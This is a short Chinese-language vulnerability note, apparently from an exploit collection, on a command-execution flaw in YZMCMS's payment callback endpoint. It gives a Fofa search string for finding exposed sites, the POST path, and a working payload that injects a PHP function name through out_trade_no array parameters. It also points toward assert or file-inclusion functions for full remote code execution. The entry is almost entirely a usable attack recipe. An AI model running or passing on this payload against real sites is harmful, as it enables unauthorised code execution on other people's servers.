# yzmcms-pay_callback-命令执行漏洞

yzmcms-pay_callback ｜ 命令执行 ｜ —
- **指纹**：`Fofa:app="yzmcms"`
- **请求**：`POST /pay/index/pay_callback.html HTTP/1.1`

**Payload**
```
out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
说明：out_trade_no[2]处接函数名。out_trade_no[1]处接参数值。rce需尝试assert函数或其他文件包含函数自行研究。补天提交证明代码执行即可。
```